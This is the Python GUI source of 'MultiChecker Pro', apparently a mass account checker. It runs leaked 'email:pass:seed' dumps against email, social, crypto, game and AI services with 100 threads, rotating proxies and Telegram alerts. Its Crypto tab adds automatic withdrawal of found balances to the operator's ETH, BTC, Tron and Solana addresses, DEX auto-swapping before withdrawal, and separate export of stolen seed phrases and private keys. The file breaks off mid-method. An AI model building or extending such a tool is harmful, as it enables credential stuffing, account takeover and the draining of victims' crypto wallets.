import customtkinter as ctk
from tkinter import filedialog, Canvas
import asyncio
import aiohttp
import csv
import json
import os
import platform
import re
import sys
import threading
from datetime import datetime
from urllib.parse import urlparse

# Опциональный импорт для drag-and-drop
try:
    from tkinterdnd2 import DND_FILES, TkinterDnD
    DRAG_DROP_AVAILABLE = True
except ImportError:
    DRAG_DROP_AVAILABLE = False
    print("⚠️ tkinterdnd2 не установлен. Drag-and-drop недоступен.")
    print("   Установите: pip install tkinterdnd2")

sys.path.insert(0, os.path.dirname(__file__))

# Установлена актуальная версия v1.0.77
APP_VERSION = "1.0.77"

if platform.system() == "Windows":
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

from checkers.email_checker import EmailChecker
from checkers.social_checker import SocialChecker
from checkers.crypto_checker import CryptoChecker
from checkers.game_checker import GameChecker
from checkers.ai_checker import AIChecker
from checkers.balance_formatter import BalanceFormatter, LogColorizer, BalanceHighlighter
from checkers.dump_parser import DumpParser
from checkers.proxy_manager import ProxyManager, load_proxies, get_next_proxy, get_proxy_count, get_stats as get_proxy_stats, reset as reset_proxies, check_all_proxies
from checkers.ultimate_finder import UltimateAccountFinder
import i18n

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

_TEXTBOX_DISPLAY_LIMIT = 5000
_GATHER_BATCH_SIZE     = 50000
_MAX_LOG_LINES         = 50000

# 🎨 УЛУЧШЕННАЯ ЦВЕТОВАЯ ПАЛИТРА v1.0.72
BG       = "#0a0e1a"      # Более глубокий темный фон
SIDEBAR  = "#0f1419"      # Темный sidebar с легким синим оттенком
CARD     = "#1a1f2e"      # Карточки с синим оттенком
CARD2    = "#242938"      # Вторичные карточки
BORDER   = "#2d3548"      # Более заметные границы
ACCENT   = "#3b82f6"      # Яркий синий (modern blue)
ACCENT2  = "#60a5fa"      # Светлый синий для hover
GREEN    = "#10b981"      # Современный зеленый (emerald)
GREEN2   = "#34d399"      # Светлый зеленый для hover
RED      = "#ef4444"      # Современный красный
RED2     = "#f87171"      # Светлый красный для hover
YELLOW   = "#f59e0b"      # Современный желтый (amber)
YELLOW2  = "#fbbf24"      # Светлый желтый для hover
PURPLE   = "#8b5cf6"      # Современный фиолетовый (violet)
PURPLE2  = "#a78bfa"      # Светлый фиолетовый для hover
ORANGE   = "#f97316"      # Современный оранжевый
ORANGE2  = "#fb923c"      # Светлый оранжевый для hover
CYAN     = "#06b6d4"      # Современный голубой (cyan)
CYAN2    = "#22d3ee"      # Светлый голубой для hover
PINK     = "#ec4899"      # Современный розовый
PINK2    = "#f472b6"      # Светлый розовый для hover
TEXT     = "#f1f5f9"      # Более яркий белый текст
TEXT2    = "#cbd5e1"      # Вторичный текст
MUTED    = "#94a3b8"      # Приглушенный текст
HOVER    = "#1e293b"      # Hover эффект
SHADOW   = "#00000040"    # Тень для карточек

# 🎯 УЛУЧШЕННЫЕ ИКОНКИ ДЛЯ ТАБОВ
TAB_META = {
    "All":    ("🌐", "all_categories"),    # Глобус для "Все"
    "Email":  ("📧", "email"),              # Конверт для Email
    "Social": ("👥", "social"),             # Люди для Social
    "Crypto": ("₿", "crypto"),              # Bitcoin для Crypto
    "Games":  ("🎮", "games"),              # Геймпад для Games
    "AI":     ("🤖", "ai"),                 # Робот для AI
}


class ToolTip:
    """Всплывающая подсказка для виджетов"""
    
    def __init__(self, widget, text, delay=500):
        self.widget = widget
        self.text = text
        self.delay = delay
        self.tooltip_window = None
        self.after_id = None
        
        # Биндим события
        self.widget.bind("<Enter>", self.on_enter)
        self.widget.bind("<Leave>", self.on_leave)
        self.widget.bind("<Button>", self.on_leave)
    
    def on_enter(self, event=None):
        """Мышь вошла в область виджета"""
        self.schedule_tooltip()
    
    def on_leave(self, event=None):
        """Мышь вышла из области виджета"""
        self.cancel_tooltip()
        self.hide_tooltip()
    
    def schedule_tooltip(self):
        """Запланировать показ подсказки"""
        self.cancel_tooltip()
        self.after_id = self.widget.after(self.delay, self.show_tooltip)
    
    def cancel_tooltip(self):
        """Отменить показ подсказки"""
        if self.after_id:
            self.widget.after_cancel(self.after_id)
            self.after_id = None
    
    def show_tooltip(self):
        """Показать подсказку"""
        if self.tooltip_window:
            return
        
        # Получаем позицию виджета
        x = self.widget.winfo_rootx() + 20
        y = self.widget.winfo_rooty() + self.widget.winfo_height() + 5
        
        # Создаем окно подсказки
        self.tooltip_window = ctk.CTkToplevel(self.widget)
        self.tooltip_window.wm_overrideredirect(True)
        self.tooltip_window.wm_geometry(f"+{x}+{y}")
        
        # Создаем фрейм с текстом
        frame = ctk.CTkFrame(
            self.tooltip_window,
            fg_color="#1c2128",
            border_color="#58a6ff",
            border_width=1,
            corner_radius=6
        )
        frame.pack()
        
        label = ctk.CTkLabel(
            frame,
            text=self.text,
            font=("Segoe UI", 11),
            text_color="#e6edf3",
            padx=10,
            pady=6
        )
        label.pack()
    
    def hide_tooltip(self):
        """Скрыть подсказку"""
        if self.tooltip_window:
            self.tooltip_window.destroy()
            self.tooltip_window = None


def create_tooltip(widget, text, delay=500):
    """Создать всплывающую подсказку для виджета"""
    return ToolTip(widget, text, delay)


class MultiCheckerApp(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title(f"MultiChecker Pro  v{APP_VERSION}")
        self.geometry("1300x820")
        self.minsize(1100, 700)
        self.configure(fg_color=BG)

        self.is_running      = False
        self.results         = []
        self.all_results     = []
        self._platform_stats = {}
        self._loaded_data    = {}

        self.checkers = {
            "Email":  EmailChecker(),
            "Social": SocialChecker(),
            "Crypto": CryptoChecker(),
            "Games":  GameChecker(),
            "AI":     AIChecker(),
        }
        self.tab_widgets   = {}
        self._translatable = []
        self._active_tab   = "All"
        self._setup_ui()
        self._load_config()
        self.protocol("WM_DELETE_WINDOW", self._on_close)

    def _setup_ui(self):
        self.grid_columnconfigure(1, weight=1)
        self.grid_rowconfigure(0, weight=1)
        self._build_sidebar()
        self._build_content()

    def _build_sidebar(self):
        # 🎨 Современный sidebar с градиентом
        sb = ctk.CTkFrame(self, width=240, fg_color=SIDEBAR, corner_radius=0)
        sb.grid(row=0, column=0, sticky="nsew")
        sb.grid_propagate(False)
        sb.grid_rowconfigure(8, weight=1)
        sb.grid_columnconfigure(0, weight=1)

        # 🎯 Логотип с градиентным эффектом
        logo = ctk.CTkFrame(sb, fg_color="transparent")
        logo.grid(row=0, column=0, padx=20, pady=(28, 10), sticky="ew")
        
        # Название с эмодзи
        title_frame = ctk.CTkFrame(logo, fg_color=CARD, corner_radius=12)
        title_frame.pack(fill="x", pady=(0, 8))
        
        ctk.CTkLabel(title_frame, text="⚡ MultiChecker", 
                     font=("Segoe UI", 20, "bold"),
                     text_color=ACCENT).pack(anchor="w", padx=16, pady=(12, 2))
        ctk.CTkLabel(title_frame, text=f"Pro Edition  •  v{APP_VERSION}", 
                     font=("Segoe UI", 10),
                     text_color=MUTED).pack(anchor="w", padx=16, pady=(0, 12))
        
        # Автор с иконкой
        author_frame = ctk.CTkFrame(logo, fg_color="transparent")
        author_frame.pack(fill="x")
        ctk.CTkLabel(author_frame, text="👨‍💻 Автор: Bes Bits", 
                     font=("Segoe UI", 10, "italic"),
                     text_color=PURPLE).pack(anchor="w", padx=4)

        # Разделитель с градиентом
        sep1 = ctk.CTkFrame(sb, height=2, fg_color=BORDER, corner_radius=1)
        sep1.grid(row=1, column=0, padx=16, pady=(8, 12), sticky="ew")

        # 🎯 Навигационные кнопки с улучшенным дизайном
        self._nav_btns = {}
        nav_colors = {
            "All": CYAN,
            "Email": PURPLE,
            "Social": PINK,
            "Crypto": YELLOW,
            "Games": GREEN,
            "AI": ORANGE,
        }
        
        for i, (tab, (icon, _)) in enumerate(TAB_META.items()):
            btn = ctk.CTkButton(
                sb, text=f"{icon}  {tab}",
                anchor="w", font=("Segoe UI", 14),
                fg_color="transparent", hover_color=HOVER,
                text_color=TEXT, corner_radius=10, height=48,
                command=lambda t=tab: self._switch_tab(t),
                border_width=0,
            )
            btn.grid(row=i + 2, column=0, padx=12, pady=3, sticky="ew")
            self._nav_btns[tab] = btn

        # Разделитель
        sep2 = ctk.CTkFrame(sb, height=2, fg_color=BORDER, corner_radius=1)
        sep2.grid(row=9, column=0, padx=16, pady=10, sticky="ew")

        # 🎨 Настройки в красивых карточках
        settings_frame = ctk.CTkFrame(sb, fg_color=CARD, corner_radius=12)
        settings_frame.grid(row=10, column=0, padx=12, pady=(0, 8), sticky="ew")
        
        # Язык
        lang_header = ctk.CTkFrame(settings_frame, fg_color="transparent")
        lang_header.pack(fill="x", padx=12, pady=(12, 4))
        ctk.CTkLabel(lang_header, text="🌍 Язык / Language", 
                     font=("Segoe UI", 11, "bold"),
                     text_color=TEXT2).pack(anchor="w")
        
        self.lang_sw = ctk.CTkSwitch(
            settings_frame, text="RU / EN", font=("Segoe UI", 12),
            command=self.toggle_lang,
            button_color=ACCENT, progress_color=ACCENT2,
            fg_color=CARD2,
        )
        self.lang_sw.pack(anchor="w", padx=12, pady=(0, 12))
        if i18n.current_lang == "ru":
            self.lang_sw.select()

        # Тема
        theme_frame = ctk.CTkFrame(sb, fg_color=CARD, corner_radius=12)
        theme_frame.grid(row=11, column=0, padx=12, pady=(0, 8), sticky="ew")
        
        theme_header = ctk.CTkFrame(theme_frame, fg_color="transparent")
        theme_header.pack(fill="x", padx=12, pady=(12, 4))
        ctk.CTkLabel(theme_header, text="🎨 Тема / Theme", 
                     font=("Segoe UI", 11, "bold"),
                     text_color=TEXT2).pack(anchor="w")
        
        self.theme_sw = ctk.CTkSwitch(
            theme_frame, text="Dark / Light", font=("Segoe UI", 12),
            command=self._toggle_theme,
            button_color=PURPLE, progress_color=PURPLE2,
            fg_color=CARD2,
        )
        self.theme_sw.pack(anchor="w", padx=12, pady=(0, 12))

        # 🎯 Статус с красивым индикатором
        status_frame = ctk.CTkFrame(sb, fg_color=CARD, corner_radius=12)
        status_frame.grid(row=12, column=0, padx=12, pady=(0, 20), sticky="ew")
        
        status_inner = ctk.CTkFrame(status_frame, fg_color="transparent")
        status_inner.pack(fill="x", padx=12, pady=12)
        
        # Индикатор статуса (точка)
        status_dot = ctk.CTkLabel(status_inner, text="●", 
                                   font=("Segoe UI", 16),
                                   text_color=GREEN)
        status_dot.pack(side="left", padx=(0, 8))
        
        self._sb_status = ctk.CTkLabel(
            status_inner, text="Готов к работе", 
            font=("Segoe UI", 12, "bold"), 
            text_color=TEXT)
        self._sb_status.pack(side="left")

        self._nav_highlight("All")

    def _nav_highlight(self, active):
        # 🎨 Улучшенная подсветка активной вкладки с градиентом
        nav_colors = {
            "All": CYAN,
            "Email": PURPLE,
            "Social": PINK,
            "Crypto": YELLOW,
            "Games": GREEN,
            "AI": ORANGE,
        }
        
        for tab, btn in self._nav_btns.items():
            if tab == active:
                # Активная вкладка - с цветным фоном
                color = nav_colors.get(tab, ACCENT)
                btn.configure(
                    fg_color=color, 
                    text_color="#ffffff",
                    font=("Segoe UI", 14, "bold"),
                    border_width=0,
                )
            else:
                # Неактивная вкладка - прозрачная
                btn.configure(
                    fg_color="transparent", 
                    text_color=TEXT2,
                    font=("Segoe UI", 14),
                    border_width=0,
                )

    def _switch_tab(self, name):
        self._active_tab = name
        self._nav_highlight(name)
        for t, f in self._frames.items():
            f.grid() if t == name else f.grid_remove()

    def _build_content(self):
        wrap = ctk.CTkFrame(self, fg_color=BG, corner_radius=0)
        wrap.grid(row=0, column=1, sticky="nsew")
        wrap.grid_columnconfigure(0, weight=1)
        wrap.grid_rowconfigure(0, weight=1)

        self._frames = {}
        for tab in TAB_META:
            f = ctk.CTkFrame(wrap, fg_color=BG, corner_radius=0)
            f.grid(row=0, column=0, sticky="nsew")
            f.grid_columnconfigure(0, weight=1)
            f.grid_rowconfigure(1, weight=1)
            self._frames[tab] = f
            self.tab_widgets[tab] = self._build_tab(f, tab)

        self._switch_tab("All")

    def _build_tab(self, frame, tab_name):
        w = {}
        icon, label_key = TAB_META[tab_name]

        bar = ctk.CTkFrame(frame, fg_color=CARD, corner_radius=0, height=58)
        bar.grid(row=0, column=0, sticky="ew")
        bar.grid_propagate(False)
        bar.grid_columnconfigure(1, weight=1)

        ctk.CTkLabel(bar, text=f"{icon}  {i18n.t(label_key)} Checker",
                     font=("Segoe UI", 17, "bold"), text_color=TEXT
                     ).grid(row=0, column=0, padx=20, pady=14, sticky="w")

        w["pill"] = ctk.CTkLabel(bar, text="● Готов",
                                  font=("Segoe UI", 11, "bold"),
                                  text_color=GREEN, fg_color=CARD2,
                                  corner_radius=10, padx=12, pady=3)
        w["pill"].grid(row=0, column=2, padx=20, sticky="e")

        body = ctk.CTkScrollableFrame(frame, fg_color=BG, corner_radius=0)
        body.grid(row=1, column=0, sticky="nsew")
        body.grid_columnconfigure(0, weight=1)

        ic = self._card(body, "Входные данные")
        ic.grid(row=0, column=0, padx=16, pady=(14, 6), sticky="ew")
        ic.grid_columnconfigure(0, weight=1)
        w["input"] = ctk.CTkTextbox(
            ic, height=108, font=("Consolas", 12),
            fg_color=CARD2, border_color=BORDER, border_width=1,
            text_color=TEXT, corner_radius=8,
        )
        w["input"].grid(row=1, column=0, padx=12, pady=(2, 12), sticky="ew")
        
        # Добавляем поддержку Ctrl+V для вставки из буфера обмена
        self._bind_paste_shortcut(w["input"])
        
        # Добавляем поддержку drag-and-drop файлов
        self._setup_drag_and_drop(w["input"])

        sc = self._card(body, "Настройки")
        sc.grid(row=1, column=0, padx=16, pady=6, sticky="ew")
        sc.grid_columnconfigure(0, weight=1)

        sr = ctk.CTkFrame(sc, fg_color="transparent")
        sr.grid(row=1, column=0, padx=12, pady=(2, 12), sticky="ew")
        sr.grid_columnconfigure(2, weight=1)
        sr.grid_columnconfigure(6, weight=2)

        def lbl(parent, text, col):
            ctk.CTkLabel(parent, text=text, font=("Segoe UI", 12),
                         text_color=MUTED).grid(row=0, column=col, padx=(0, 6), sticky="w")

        lbl(sr, "Потоки", 0)
        w["threads"] = ctk.CTkEntry(sr, width=65, font=("Segoe UI", 12),
                                     fg_color=CARD2, border_color=BORDER,
                                     text_color=TEXT, corner_radius=8)
        w["threads"].insert(0, "100")
        w["threads"].grid(row=0, column=1, padx=(0, 18), sticky="w")

        lbl(sr, "Таймаут (с)", 3)
        w["timeout"] = ctk.CTkEntry(sr, width=62, font=("Segoe UI", 12),
                                     fg_color=CARD2, border_color=BORDER,
                                     text_color=TEXT, corner_radius=8)
        w["timeout"].insert(0, "10")
        w["timeout"].grid(row=0, column=4, padx=(0, 18), sticky="w")

        lbl(sr, "Прокси", 5)
        
        # Фрейм для прокси поля и кнопки обзора
        proxy_frame = ctk.CTkFrame(sr, fg_color="transparent")
        proxy_frame.grid(row=0, column=6, sticky="ew")
        proxy_frame.grid_columnconfigure(0, weight=1)
        
        w["proxy"] = ctk.CTkEntry(proxy_frame, font=("Segoe UI", 12), fg_color=CARD2,
                                   border_color=BORDER, text_color=TEXT,
                                   corner_radius=8,
                                   placeholder_text="socks5://ip:port или proxy.txt")
        w["proxy"].grid(row=0, column=0, sticky="ew", padx=(0, 6))
        create_tooltip(w["proxy"], "Поддержка: HTTP, HTTPS, SOCKS4, SOCKS5\nОдин прокси: socks5://user:pass@ip:port\nИз файла: proxy.txt (автоматическая ротация)")
        
        # Кнопка обзора для выбора файла прокси
        proxy_browse_btn = ctk.CTkButton(
            proxy_frame, text="📁", width=36, height=28,
            fg_color=CARD, hover_color=HOVER,
            font=("Segoe UI", 14), corner_radius=6,
            command=lambda: self._browse_proxy_file(w)
        )
        proxy_browse_btn.grid(row=0, column=1)
        create_tooltip(proxy_browse_btn, "Выбрать файл с прокси")

        tg_row = ctk.CTkFrame(sc, fg_color="transparent")
        tg_row.grid(row=2, column=0, padx=12, pady=(2, 12), sticky="ew")
        tg_row.grid_columnconfigure(1, weight=1)
        tg_row.grid_columnconfigure(4, weight=1)

        ctk.CTkLabel(tg_row, text=i18n.t("tg_token"), font=("Segoe UI", 12),
                     text_color=MUTED).grid(row=0, column=0, padx=(0, 6), sticky="w")
        w["tg_token"] = ctk.CTkEntry(tg_row, width=180, font=("Segoe UI", 12),
                                      fg_color=CARD2, border_color=BORDER,
                                      text_color=TEXT, corner_radius=8,
                                      placeholder_text="123456:ABC-DEF...")
        w["tg_token"].grid(row=0, column=1, padx=(0, 18), sticky="ew")

        ctk.CTkLabel(tg_row, text=i18n.t("tg_chat_id"), font=("Segoe UI", 12),
                     text_color=MUTED).grid(row=0, column=2, padx=(0, 6), sticky="w")
        w["tg_chat_id"] = ctk.CTkEntry(tg_row, width=120, font=("Segoe UI", 12),
                                        fg_color=CARD2, border_color=BORDER,
                                        text_color=TEXT, corner_radius=8,
                                        placeholder_text="-100123456")
        w["tg_chat_id"].grid(row=0, column=3, padx=(0, 18), sticky="w")

        w["tg_enabled"] = ctk.CTkSwitch(
            tg_row, text=i18n.t("tg_enabled"), font=("Segoe UI", 12),
            button_color=ACCENT, progress_color=ACCENT, text_color=MUTED,
        )
        w["tg_enabled"].grid(row=0, column=4, sticky="w")

        # АВТОВЫВОД (только для Crypto чекера)
        if tab_name == "Crypto":
            aw_card = self._card(body, "💰 Автовывод средств")
            aw_card.grid(row=2, column=0, padx=16, pady=6, sticky="ew")
            aw_card.grid_columnconfigure(0, weight=1)
            
            # Переключатель автовывода
            aw_header = ctk.CTkFrame(aw_card, fg_color="transparent")
            aw_header.grid(row=1, column=0, padx=12, pady=(2, 8), sticky="ew")
            
            w["auto_withdraw_enabled"] = ctk.CTkSwitch(
                aw_header, text="Включить автовывод", font=("Segoe UI", 13, "bold"),
                button_color=GREEN, progress_color=GREEN, text_color=TEXT,
            )
            w["auto_withdraw_enabled"].grid(row=0, column=0, sticky="w")
            
            ctk.CTkLabel(aw_header, text="⚠️ Используйте осторожно!", 
                         font=("Segoe UI", 10), text_color=YELLOW
                         ).grid(row=0, column=1, padx=12, sticky="w")
            
            # Адреса для вывода
            aw_addresses = ctk.CTkFrame(aw_card, fg_color=CARD2, corner_radius=8)
            aw_addresses.grid(row=2, column=0, padx=12, pady=(0, 12), sticky="ew")
            aw_addresses.grid_columnconfigure(1, weight=1)
            
            # ETH адрес
            ctk.CTkLabel(aw_addresses, text="ETH/BSC/Polygon:", font=("Segoe UI", 11),
                         text_color=MUTED).grid(row=0, column=0, padx=10, pady=8, sticky="w")
            w["withdraw_eth"] = ctk.CTkEntry(aw_addresses, font=("Consolas", 11),
                                              fg_color=CARD, border_color=BORDER,
                                              text_color=TEXT, corner_radius=6,
                                              placeholder_text="0x...")
            w["withdraw_eth"].grid(row=0, column=1, padx=(0, 10), pady=8, sticky="ew")
            self._bind_paste_shortcut(w["withdraw_eth"])
            
            # BTC адрес
            ctk.CTkLabel(aw_addresses, text="Bitcoin:", font=("Segoe UI", 11),
                         text_color=MUTED).grid(row=1, column=0, padx=10, pady=8, sticky="w")
            w["withdraw_btc"] = ctk.CTkEntry(aw_addresses, font=("Consolas", 11),
                                              fg_color=CARD, border_color=BORDER,
                                              text_color=TEXT, corner_radius=6,
                                              placeholder_text="bc1... или 1... или 3...")
            w["withdraw_btc"].grid(row=1, column=1, padx=(0, 10), pady=8, sticky="ew")
            self._bind_paste_shortcut(w["withdraw_btc"])
            
            # TRX адрес
            ctk.CTkLabel(aw_addresses, text="Tron:", font=("Segoe UI", 11),
                         text_color=MUTED).grid(row=2, column=0, padx=10, pady=8, sticky="w")
            w["withdraw_trx"] = ctk.CTkEntry(aw_addresses, font=("Consolas", 11),
                                              fg_color=CARD, border_color=BORDER,
                                              text_color=TEXT, corner_radius=6,
                                              placeholder_text="T...")
            w["withdraw_trx"].grid(row=2, column=1, padx=(0, 10), pady=8, sticky="ew")
            self._bind_paste_shortcut(w["withdraw_trx"])
            
            # SOL адрес
            ctk.CTkLabel(aw_addresses, text="Solana:", font=("Segoe UI", 11),
                         text_color=MUTED).grid(row=3, column=0, padx=10, pady=8, sticky="w")
            w["withdraw_sol"] = ctk.CTkEntry(aw_addresses, font=("Consolas", 11),
                                              fg_color=CARD, border_color=BORDER,
                                              text_color=TEXT, corner_radius=6,
                                              placeholder_text="...")
            w["withdraw_sol"].grid(row=3, column=1, padx=(0, 10), pady=(8, 12), sticky="ew")
            self._bind_paste_shortcut(w["withdraw_sol"])
            
            # Минимальные суммы
            aw_min = ctk.CTkFrame(aw_card, fg_color="transparent")
            aw_min.grid(row=3, column=0, padx=12, pady=(0, 12), sticky="ew")
            aw_min.grid_columnconfigure((1, 3, 5, 7), weight=1)
            
            ctk.CTkLabel(aw_min, text="Минимум для вывода:", font=("Segoe UI", 11, "bold"),
                         text_color=TEXT).grid(row=0, column=0, padx=(0, 12), sticky="w")
            
            ctk.CTkLabel(aw_min, text="ETH:", font=("Segoe UI", 10),
                         text_color=MUTED).grid(row=0, column=1, padx=4, sticky="e")
            w["min_eth"] = ctk.CTkEntry(aw_min, width=70, font=("Segoe UI", 10),
                                         fg_color=CARD2, border_color=BORDER,
                                         text_color=TEXT, corner_radius=6)
            w["min_eth"].insert(0, "0.01")
            w["min_eth"].grid(row=0, column=2, padx=4, sticky="w")
            
            ctk.CTkLabel(aw_min, text="BTC:", font=("Segoe UI", 10),
                         text_color=MUTED).grid(row=0, column=3, padx=4, sticky="e")
            w["min_btc"] = ctk.CTkEntry(aw_min, width=70, font=("Segoe UI", 10),
                                         fg_color=CARD2, border_color=BORDER,
                                         text_color=TEXT, corner_radius=6)
            w["min_btc"].insert(0, "0.001")
            w["min_btc"].grid(row=0, column=4, padx=4, sticky="w")
            
            ctk.CTkLabel(aw_min, text="TRX:", font=("Segoe UI", 10),
                         text_color=MUTED).grid(row=0, column=5, padx=4, sticky="e")
            w["min_trx"] = ctk.CTkEntry(aw_min, width=70, font=("Segoe UI", 10),
                                         fg_color=CARD2, border_color=BORDER,
                                         text_color=TEXT, corner_radius=6)
            w["min_trx"].insert(0, "10")
            w["min_trx"].grid(row=0, column=6, padx=4, sticky="w")
            
            ctk.CTkLabel(aw_min, text="SOL:", font=("Segoe UI", 10),
                         text_color=MUTED).grid(row=0, column=7, padx=4, sticky="e")
            w["min_sol"] = ctk.CTkEntry(aw_min, width=70, font=("Segoe UI", 10),
                                         fg_color=CARD2, border_color=BORDER,
                                         text_color=TEXT, corner_radius=6)
            w["min_sol"].insert(0, "0.1")
            w["min_sol"].grid(row=0, column=8, padx=4, sticky="w")
            
            # АВТООБМЕН ТОКЕНОВ (только для Crypto чекера)
            swap_card = self._card(body, "🔄 Автообмен токенов")
            swap_card.grid(row=3, column=0, padx=16, pady=6, sticky="ew")
            swap_card.grid_columnconfigure(0, weight=1)
            
            # Переключатель автообмена
            swap_header = ctk.CTkFrame(swap_card, fg_color="transparent")
            swap_header.grid(row=1, column=0, padx=12, pady=(2, 8), sticky="ew")
            
            w["auto_swap_enabled"] = ctk.CTkSwitch(
                swap_header, text="Включить автообмен", font=("Segoe UI", 13, "bold"),
                button_color=PURPLE, progress_color=PURPLE, text_color=TEXT,
            )
            w["auto_swap_enabled"].grid(row=0, column=0, sticky="w")
            
            ctk.CTkLabel(swap_header, text="Меняет токены на ETH/BNB перед выводом", 
                         font=("Segoe UI", 10), text_color=MUTED
                         ).grid(row=0, column=1, padx=12, sticky="w")
            
            # Настройки автообмена
            swap_settings = ctk.CTkFrame(swap_card, fg_color=CARD2, corner_radius=8)
            swap_settings.grid(row=2, column=0, padx=12, pady=(0, 12), sticky="ew")
            swap_settings.grid_columnconfigure((1, 3, 5, 7), weight=1)
            
            ctk.CTkLabel(swap_settings, text="Цель:", font=("Segoe UI", 11),
                         text_color=MUTED).grid(row=0, column=0, padx=10, pady=8, sticky="w")
            w["swap_target"] = ctk.CTkComboBox(swap_settings, width=100, font=("Segoe UI", 11),
                                                values=["ETH", "BNB", "MATIC"],
                                                fg_color=CARD, border_color=BORDER,
                                                button_color=PURPLE, button_hover_color="#a371f7",
                                                text_color=TEXT, corner_radius=6)
            w["swap_target"].set("ETH")
            w["swap_target"].grid(row=0, column=1, padx=(0, 12), pady=8, sticky="w")
            
            ctk.CTkLabel(swap_settings, text="Минимум USD:", font=("Segoe UI", 11),
                         text_color=MUTED).grid(row=0, column=2, padx=10, pady=8, sticky="w")
            w["swap_min_usd"] = ctk.CTkEntry(swap_settings, width=80, font=("Segoe UI", 11),
                                              fg_color=CARD, border_color=BORDER,
                                              text_color=TEXT, corner_radius=6)
            w["swap_min_usd"].insert(0, "1.0")
            w["swap_min_usd"].grid(row=0, column=3, padx=(0, 12), pady=8, sticky="w")
            
            ctk.CTkLabel(swap_settings, text="Slippage %:", font=("Segoe UI", 11),
                         text_color=MUTED).grid(row=0, column=4, padx=10, pady=8, sticky="w")
            w["swap_slippage"] = ctk.CTkEntry(swap_settings, width=70, font=("Segoe UI", 11),
                                               fg_color=CARD, border_color=BORDER,
                                               text_color=TEXT, corner_radius=6)
            w["swap_slippage"].insert(0, "1.0")
            w["swap_slippage"].grid(row=0, column=5, padx=(0, 12), pady=8, sticky="w")
            
            ctk.CTkLabel(swap_settings, text="DEX:", font=("Segoe UI", 11),
                         text_color=MUTED).grid(row=0, column=6, padx=10, pady=8, sticky="w")
            w["swap_dex"] = ctk.CTkComboBox(swap_settings, width=120, font=("Segoe UI", 11),
                                             values=["Uniswap", "PancakeSwap", "QuickSwap"],
                                             fg_color=CARD, border_color=BORDER,
                                             button_color=PURPLE, button_hover_color="#a371f7",
                                             text_color=TEXT, corner_radius=6)
            w["swap_dex"].set("Uniswap")
            w["swap_dex"].grid(row=0, column=7, padx=(0, 10), pady=8, sticky="w")

        # 🎨 Улучшенные кнопки действий с иконками и градиентами
        bf = ctk.CTkFrame(body, fg_color="transparent")
        bf.grid(row=4 if tab_name == "Crypto" else 2, column=0, padx=16, pady=8, sticky="ew")

        def btn(parent, text, fg, hv, cmd, width=None, icon=""):
            """Создать красивую кнопку с иконкой"""
            display_text = f"{icon}  {text}" if icon else text
            kw = dict(
                text=display_text, 
                fg_color=fg, 
                hover_color=hv,
                font=("Segoe UI", 13, "bold"), 
                corner_radius=10, 
                height=42, 
                command=cmd,
                border_width=0,
            )
            if width:
                kw["width"] = width
            return ctk.CTkButton(parent, **kw)

        # Основные кнопки с улучшенным дизайном
        btn_start = btn(bf, "Старт", GREEN, GREEN2, lambda: self.start_check(tab_name), 150, "▶")
        btn_start.pack(side="left", padx=(0,8))
        
        btn_stop = btn(bf, "Стоп", RED, RED2, self.stop_check, 120, "■")
        btn_stop.pack(side="left", padx=(0,8))
        
        btn_clear = btn(bf, "Очистить", CARD, HOVER, lambda: self.clear_output(w), 130, "🗑")
        btn_clear.pack(side="left", padx=(0,8))
        
        btn_file = btn(bf, "Файл", CYAN, CYAN2, lambda: self.import_file(w), 120, "📁")
        btn_file.pack(side="left", padx=(0,8))
        
        btn_paste = btn(bf, "", PURPLE, PURPLE2, lambda: self._paste_clipboard(w), 50, "📋")
        btn_paste.pack(side="left", padx=(0,8))
        
        btn_dupes = btn(bf, "Дубли", PURPLE, PURPLE2, lambda: self.remove_duplicates(w), 120, "⊘")
        btn_dupes.pack(side="left", padx=(0,8))
        
        btn_dump = btn(bf, "ДАМП", ORANGE, ORANGE2, lambda: self.parse_dump(w), 130, "📋")
        btn_dump.pack(side="left", padx=(0,8))
        
        # Добавляем tooltips для кнопок
        create_tooltip(btn_start, "Запустить проверку данных")
        create_tooltip(btn_stop, "Остановить текущую проверку")
        create_tooltip(btn_clear, "Очистить поле вывода")
        create_tooltip(btn_file, "Загрузить данные из файла")
        create_tooltip(btn_paste, "Вставить из буфера обмена (Ctrl+V)")
        create_tooltip(btn_dupes, "Удалить дубликаты из списка")
        create_tooltip(btn_dump, "Парсить дамп (email:pass:seed, user|pass|key и т.д.)")

        # 🎨 Красивая панель экспорта
        eg = ctk.CTkFrame(bf, fg_color=CARD, corner_radius=12, border_width=1, border_color=BORDER)
        eg.pack(side="left", padx=(12, 0))
        
        export_header = ctk.CTkFrame(eg, fg_color="transparent")
        export_header.pack(side="left", padx=12, pady=8)
        ctk.CTkLabel(export_header, text="💾 Экспорт:", font=("Segoe UI", 12, "bold"),
                     text_color=TEXT2).pack(side="left", padx=(0, 8))
        
        # Кнопки экспорта с сохранением ссылок для tooltips
        export_buttons = []
        
        export_formats = [
            ("txt", "TXT", ACCENT),
            ("json", "JSON", CYAN),
            ("csv", "CSV", GREEN),
            ("xlsx", "EXCEL", PURPLE)
        ]
        
        for fmt, lbl_text, color in export_formats:
            btn_export = ctk.CTkButton(
                eg, text=lbl_text, 
                fg_color="transparent",
                hover_color=color, 
                font=("Segoe UI", 11, "bold"),
                text_color=color, 
                corner_radius=8, 
                height=32, 
                width=60,
                border_width=1,
                border_color=color,
                command=lambda f=fmt: self.export_results(w, f)
            )
            btn_export.pack(side="left", padx=3, pady=4)
            export_buttons.append(btn_export)

        btn_balance = ctk.CTkButton(eg, text="$", fg_color="transparent",
                       hover_color=HOVER, font=("Segoe UI", 11, "bold"),
                       text_color=GREEN, corner_radius=6, height=30, width=36,
                       command=lambda: self.export_balance_only(w))
        btn_balance.pack(side="left", padx=2, pady=4)
        export_buttons.append(btn_balance)
        
        # Кнопки ручного раздельного сохранения Сид-фраз и Приватных ключей
        btn_seed = ctk.CTkButton(eg, text="🌱 SEED", fg_color="transparent",
                       hover_color=HOVER, font=("Segoe UI", 11, "bold"),
                       text_color=PURPLE, corner_radius=6, height=30, width=64,
                       command=lambda: self.export_by_type(w, "seed"))
        btn_seed.pack(side="left", padx=2, pady=4)
        export_buttons.append(btn_seed)

        btn_key = ctk.CTkButton(eg, text="🔑 KEY", fg_color="transparent",
                       hover_color=HOVER, font=("Segoe UI", 11, "bold"),
                       text_color=ORANGE, corner_radius=6, height=30, width=60,
                       command=lambda: self.export_by_type(w, "privkey"))
        btn_key.pack(side="left", padx=2, pady=4)
